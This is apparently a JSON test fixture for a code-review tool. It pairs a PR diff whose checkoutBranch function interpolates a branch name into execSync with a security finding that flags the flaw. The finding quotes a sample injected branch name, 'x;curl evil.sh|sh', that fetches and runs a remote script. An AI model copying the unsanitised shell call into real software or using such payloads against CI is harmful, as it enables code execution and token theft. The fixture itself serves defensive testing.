@@ -1,0 +1,19 @@
+{
+  "name": "security-with-todo",
+  "case": "security-with-todo",
+  "allowed": [
+    "blocker"
+  ],
+  "finding": {
+    "title": "Branch name reaches a shell command",
+    "file": "scripts/ci/checkout.ts",
+    "line": 9,
+    "description": "`checkoutBranch` interpolates `pr.head.ref`, which the PR author picks, into a string run by `execSync` through a shell. A fork PR with a branch named `x;curl evil.sh|sh` runs that command in CI with the job's token.",
+    "severity": "blocker",
+    "reviewers": [
+      "Security"
+    ],
+    "suggestedFix": "execFileSync('git', ['checkout', pr.head.ref]);"
+  },
+  "prDiff": "diff --git a/scripts/ci/checkout.ts b/scripts/ci/checkout.ts\nindex 1111111..2222222 100644\n--- a/scripts/ci/checkout.ts\n+++ b/scripts/ci/checkout.ts\n@@ -5,2 +5,8 @@\n import { execSync } from 'child_process';\n \n+export function checkoutBranch(pr: PullRequest): void {\n+  // TODO(#88): sanitize the branch name once the CI refactor lands.\n+  execSync(`git checkout ${pr.head.ref}`);\n+}\n+\n+export const DEFAULT_REMOTE = 'origin';\n"
+}
